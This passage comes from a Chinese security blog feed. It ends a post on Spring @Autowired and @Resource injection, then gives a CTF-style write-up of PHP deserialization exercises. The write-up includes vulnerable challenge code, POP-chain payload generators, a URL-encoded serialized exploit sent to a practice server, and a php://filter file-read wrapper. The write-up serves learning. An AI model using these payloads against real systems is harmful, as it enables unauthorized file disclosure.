定义的注解，通过名称进行依赖注入。</li></ul></li><li><p><strong>注入方式不同：</strong></p><ul><li>​<code>@Autowired</code>​ 默认按照类型匹配的方式进行注入，如果存在多个相同类型的实例，可以结合 <code>@Qualifier</code>​ 注解来指定具体实例。</li><li>​<code>@Resource</code>​ 默认按照名称匹配的方式进行注入，它支持使用 <code>name</code>​ 或 <code>type</code>​ 属性来指定名称或类型进行匹配。</li></ul></li><li><p><strong>支持的类型不同：</strong></p><ul><li>​<code>@Autowired</code>​ 支持通过构造方法注入、属性注入、Setter 注入的方式实现依赖注入。</li><li>​<code>@Resource</code>​ 支持通过属性注入、Setter 注入的方式实现依赖注入，不支持构造方法注入。</li></ul></li><li><p><strong>应用范围不同：</strong></p><ul><li>​<code>@Autowired</code>​ 主要用于 Spring 框架中的组件（如 Spring Bean）的依赖注入。</li><li>​<code>@Resource</code>​ 是 JavaEE 规范中的注解，它可以用于依赖注入和资源的获取，对于不依赖于 Spring 框架的应用也可以使用。</li></ul></li></ol><h4 id="3-2，同⼀类型多个-Bean-报错"><a href="#3-2，同⼀类型多个-Bean-报错" class="headerlink" title="3.2，同⼀类型多个 @Bean 报错"></a>3.2，同⼀类型多个 @Bean 报错</h4><p>当出现多个 Bean 返回同⼀对象类型时，程序会报错。解决同一个类型，多个bean的解决方案有以下两个：</p><p><strong>1，使用</strong>  <strong>​<code>@Resource(name=&quot;&quot;)</code>​</strong> ​</p><p><img src="/.com//%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/assets/image-20250519114126-lew7r0p.png" alt="image"></p><p><strong>2，搭配</strong>  <strong>​<code>@Autowired</code>​</strong>​ <strong>使用</strong>  <strong>​<code>@Qualifierr(value = &quot;&quot;)</code>​</strong> ​</p><p><img src="/.com//%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/assets/image-20250519114131-ekqswo4.png" alt="image"></p><p>核心总结<br>1，三种对象注入的实现方式以及优缺点？<br>属性注入，Setter注入和构造方法注入是在依赖注入中常用的三种方式，它们各有优缺点：</p><p>1，属性注入方式：其实现简单，易于理解和维护，但是其不能注入不可变对象，只适用于IoC容器，并且违反单一设计原则的概率大。</p><p>2，Setter注入方式：其符合单一设计原则，但是其不能注入不可变对象，并且使用Setter注入的对象可能被修改。</p><p>3，构造方法注入方式：其可以注入不可变对象，注入的对象不能被改变，保证注入对象完全被初始化，并且具有通用性，但是其不符合单一设计原则。</p><p>注意：在上述的三种对象注入的实现方式中，构造方法注入是Spring推荐的注入方式。</p><hr><p><strong>思考：为什么构造方法可以注入不可变变量，而属性注入和Setter注入却不行呢？</strong></p><p>解答：在 Java 中，被<code>final</code>​修饰的对象，要么直接进行赋值，要么就在构造方法中进行赋值，两种情况必须满足一个，否则方式报错。</p><hr><p>2，@Autowired 和 @Resource 注入注解的区别？<br>@Autowired 和 @Resource 都是在 Spring 框架中用于注入依赖的注解，它们有以下区别：</p><p>1，来源不同：@Autowired 是 Spring 框架提供的注解，而@Resource 是 JavaEE 定义的注解。</p><p>2，注入方式不同：@Autowired 默认按照类型匹配的方式进行注入，而@Resource 默认按照名称匹配的方式进行注入。</p><p>3，支持的类型不同：@Resource 支持通过属性注入、Setter 注入的方式实现依赖注入，不支持构造方法注入，而@Autowired 支持。</p><p>4，应用范围不同：@Autowired 主要用于 Spring 框架中的组件的依赖注入，而@Resource对于不依赖于 Spring 框架的应用也可使用。</p><hr><h4 id="3，同⼀类型多个-Bean-报错的解决方案有哪些？"><a href="#3，同⼀类型多个-Bean-报错的解决方案有哪些？" class="headerlink" title="3，同⼀类型多个 @Bean 报错的解决方案有哪些？"></a>3，同⼀类型多个 @Bean 报错的解决方案有哪些？</h4><p>解决同一个类型 @Bean 报错的解决方案有以下两个：</p><ol><li>使用 <code>@Resource(name=&quot;&quot;)</code>​</li><li>使用 <code>@Qualifierr(value = &quot;&quot;)</code>​ 【搭配@Autowired使用】</li></ol>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>注入漏洞</category>
      
      <category>反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>反序列化</tag>
      
      <tag>对象注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化题目练习</title>
    <link href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <url>/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><h2 id="例题1："><a href="#例题1：" class="headerlink" title="例题1："></a>例题1：</h2><p><a href="http://122.114.252.87:1110/index2.php">http://122.114.252.87:1110/index2.php</a></p><h4 id="解法1：-非预期解，手工调用"><a href="#解法1：-非预期解，手工调用" class="headerlink" title="解法1： 非预期解，手工调用"></a>解法1： 非预期解，手工调用</h4><p>第一步首先把网页上源代码复制下来 删除没用的 注释方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// public function get_file($value)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     $text = base64_encode(file_get_contents($value));</span><br>    <span class="hljs-comment">//     return $text;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class1</span>;<br>    <span class="hljs-comment">// public function __construct($name=&#x27;index.php&#x27;)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     $this-&gt;source = $name;</span><br>    <span class="hljs-comment">//     echo $this-&gt;source.&#x27; Welcome&#x27;.&quot;&lt;br&gt;&quot;;    </span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">//关键点  会读取文件内容  我们的目标就是读取flag.php里面的内容</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;   <br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;class1-&gt;<span class="hljs-title function_ invoke__">get_file</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-comment">//  因为get_file方法在Read中所有class1一定是Read的一个实例化对象</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// public function _show()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source)) &#123;</span><br>    <span class="hljs-comment">//         die(&#x27;hacker&#x27;);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         highlight_file($this-&gt;source);</span><br>    <span class="hljs-comment">//     &#125;</span><br><br>    <span class="hljs-comment">// &#125;</span><br> <br>    <span class="hljs-comment">// public function Change()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br>    <span class="hljs-comment">//         echo &quot;hacker&quot;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public function __get($key)&#123;</span><br>    <span class="hljs-comment">//     $function=$this-&gt;$key;</span><br>    <span class="hljs-comment">//     $this-&gt;&#123;$key&#125;();</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-comment">// if(isset($_GET[&#x27;sid&#x27;]))</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//     $sid=$_GET[&#x27;sid&#x27;];</span><br><span class="hljs-comment">//     $config=unserialize($_GET[&#x27;config&#x27;]);</span><br><span class="hljs-comment">//     $config-&gt;$sid;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// else</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//     $show = new Show(&#x27;index2.php&#x27;);</span><br><span class="hljs-comment">//     $show-&gt;_show();</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-keyword">var</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Read</span>();<br><span class="hljs-variable">$s</span> -&gt; class1 = <span class="hljs-variable">$r</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s</span>)));<br></code></pre></td></tr></table></figure><p>非预期可以直接通过参数sid手动调用__toString方法而不是使用魔术方法 注意调用时不要加括号</p><p>输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//122.114.252.87:1110/index2.php?config=O%3A4%3A%22Show%22%3A3%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A6%3A%22class1%22%3BO%3A4%3A%22Read%22%3A0%3A%7B%7D%7D&amp;sid=__toString</span><br></code></pre></td></tr></table></figure><p>得到base64编码的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAKJGZsYWcgPSAiZmxhZ3syNTZkN2ZkNi1kYjUxLTQ0YjktOGIyZC04OGUxN2IwODg2ZTl9IjsKPz4=<br></code></pre></td></tr></table></figure><p>进行解密</p><p><img src="/.com//17476536468948387717240924382119-20250519192047-ij0gmrz.png" alt="17476536468948387717240924382119"></p><p>成功得到flag！</p><h4 id="解法2：利用魔术方法调用-toString方法"><a href="#解法2：利用魔术方法调用-toString方法" class="headerlink" title="解法2：利用魔术方法调用__toString方法"></a>解法2：利用魔术方法调用__toString方法</h4><blockquote><p>__toString()    &#x2F;&#x2F;把类当作字符串使用时触发</p></blockquote><p>在正则表达式中把类当做了字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// public function get_file($value)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     $text = base64_encode(file_get_contents($value));</span><br>    <span class="hljs-comment">//     return $text;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class1</span>;<br>    <span class="hljs-comment">// public function __construct($name=&#x27;index.php&#x27;)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     $this-&gt;source = $name;</span><br>    <span class="hljs-comment">//     echo $this-&gt;source.&#x27; Welcome&#x27;.&quot;&lt;br&gt;&quot;;    </span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">//关键点  会读取文件内容  我们的目标就是读取flag.php里面的内容</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;   <br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;class1-&gt;<span class="hljs-title function_ invoke__">get_file</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-comment">//  因为get_file方法在Read中所有class1一定是Read的一个实例化对象</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// public function _show()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source)) &#123;</span><br>    <span class="hljs-comment">//         die(&#x27;hacker&#x27;);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         highlight_file($this-&gt;source);</span><br>    <span class="hljs-comment">//     &#125;</span><br><br>    <span class="hljs-comment">// &#125;</span><br> <br>    <span class="hljs-comment">// public function Change()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br>    <span class="hljs-comment">//         echo &quot;hacker&quot;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public function __get($key)&#123;</span><br>    <span class="hljs-comment">//     $function=$this-&gt;$key;</span><br>    <span class="hljs-comment">//     $this-&gt;&#123;$key&#125;();</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-comment">// if(isset($_GET[&#x27;sid&#x27;]))</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//     $sid=$_GET[&#x27;sid&#x27;];</span><br><span class="hljs-comment">//     $config=unserialize($_GET[&#x27;config&#x27;]);</span><br><span class="hljs-comment">//     $config-&gt;$sid;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// else</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//     $show = new Show(&#x27;index2.php&#x27;);</span><br><span class="hljs-comment">//     $show-&gt;_show();</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">//倒着写的 这个是终点</span><br><span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Read</span>();<br><br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-keyword">var</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$s</span> -&gt; class1 = <span class="hljs-variable">$r</span>;<br><br><span class="hljs-variable">$s2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$s2</span> -&gt; source = <span class="hljs-variable">$s</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s2</span>)));  <span class="hljs-comment">//最后是对起点进行序列化</span><br></code></pre></td></tr></table></figure><p>一定要注意好&#x3D;&#x3D;s和s2&#x3D;&#x3D;的区别，首先肯定是对s2进行序列化 然后sid中执行字符串匹配的方法，</p><p>当通过&#x3D;&#x3D;s2去调用source&#x3D;&#x3D;的时候，因为source里面是&#x3D;&#x3D;类的对象&#x3D;&#x3D;，这个时候该&#x3D;&#x3D;对象也会执行&#x3D;&#x3D;，相当于去把&#x3D;&#x3D;s这个类对象&#x3D;&#x3D;，当做&#x3D;&#x3D;字符串去匹配正则表达式&#x3D;&#x3D;的时候，触发了&#x3D;&#x3D;s的toString方法&#x3D;&#x3D;，与&#x3D;&#x3D;s2没有关系，s2只是一个存放s的入口&#x3D;&#x3D;。</p><p>此外当sid为&#x3D;&#x3D;_show&#x3D;&#x3D;的时候会出现&#x3D;&#x3D;两次加密字符串&#x3D;&#x3D;是因为触发了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>&#125;<br></code></pre></td></tr></table></figure><p>因为$this -&gt; source的结果就是编码字符串</p><p>然后还有一进入正则表达式的方法时就调用了一次</p><p>所以一共显示了两次</p><p>解密后成功得到flag！</p><hr><h2 id="例题2："><a href="#例题2：" class="headerlink" title="例题2："></a>例题2：</h2><p><a href="http://122.114.252.87:1110/index3.php">http://122.114.252.87:1110/index3.php</a></p><h6 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php">index3.php You are in my range!<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vox</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$headset</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sound</span>;<br>    <span class="hljs-comment">//考虑fun函数作为最终的利用点</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params"><span class="hljs-variable">$pulse</span></span>)</span>&#123;<br>            <span class="hljs-comment">//include！！！！危险函数 文件包含 通过文件流 伪协议 base64 读取flag.php文件</span><br>                <span class="hljs-keyword">include</span>(<span class="hljs-variable">$pulse</span>);<br>        &#125;<br>    <span class="hljs-comment">//调用invoke魔术方法  对象作为函数时触发 找用小括号的地方</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-comment">//这里可以调用fun函数</span><br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fun</span>(<span class="hljs-variable">$this</span>-&gt;headset);<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Saw</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$fearless</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$gun</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<span class="hljs-comment">#创造对象时自动调用</span><br>                <span class="hljs-variable language_">$this</span>-&gt;fearless = <span class="hljs-variable">$file</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fearless . <span class="hljs-string">&#x27; You are in my range!&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>       <span class="hljs-comment">//对象视为字符串触发 定位到正则匹配</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment">//把gun设置为Petal的对象访问fearless 属于不存在属性</span><br>            <span class="hljs-comment">//需要注意的是gun设定为一个数组了 其中有一个键值为&#x27;gun&#x27; 所以给该键值进行相应赋值value gun = array(&quot;gun&quot; =&gt; $b)</span><br>                <span class="hljs-variable language_">$this</span>-&gt;gun[<span class="hljs-string">&#x27;gun&#x27;</span>]-&gt;fearless;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Saw&quot;</span>;<br>        &#125;<br><span class="hljs-comment">//只是一个普通的方法 因为只有一个下划线  发现根本调用不了直接排除就好了</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_pain</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fearless)&#123;<br>                        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;fearless);<br>                &#125;<br>        &#125;<br>       <span class="hljs-comment">//wakeup使用unserialize的时候自动触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>               <span class="hljs-comment">//正则匹配 把对象视为字符串 触发其toString方法</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|php|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;fearless))&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Does it hurt? That&#x27;s right&quot;</span>;<br>                        <span class="hljs-variable language_">$this</span>-&gt;fearless = <span class="hljs-string">&quot;index3.php&quot;</span>;<br>                &#125;<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Petal</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$seed</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;seed = <span class="hljs-keyword">array</span>();<br>        &#125;<br>        <span class="hljs-comment">//寻找不可访问的属性 寻找箭头</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$sun</span></span>)</span>&#123;<br>                <br>            <span class="hljs-variable">$Nourishment</span> = <span class="hljs-variable language_">$this</span>-&gt;seed;<br>            <span class="hljs-comment">//函数的调用后面有括号  可以把类的对象作为函数调用 触发invoke </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$Nourishment</span>();<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ozo&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ozo&#x27;</span>]);   <span class="hljs-comment">//只有反序列化一定是自动触发的过程</span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$Saw</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Saw</span>(<span class="hljs-string">&#x27;index3.php&#x27;</span>);<br>        <span class="hljs-variable">$Saw</span>-&gt;<span class="hljs-title function_ invoke__">_pain</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h6 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h6><p>起始位置：先考虑魔术方法，destruct或者wakeup 现在题目中只能去利用wakeup作为起始。</p><p>结束位置：利用危险的函数，比如include，highlight_file去进行文件内容的读取</p><p>知识点补充：</p><ol><li>遇到正则匹配不要慌，那正是toString方法自动调用的入口</li><li>如果需要触发的魔术方法在一个方法中，那么就new两个对象交互使用</li><li>include文件包含读取php文件内容常用模板 文件流伪协议base64 即：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><ol 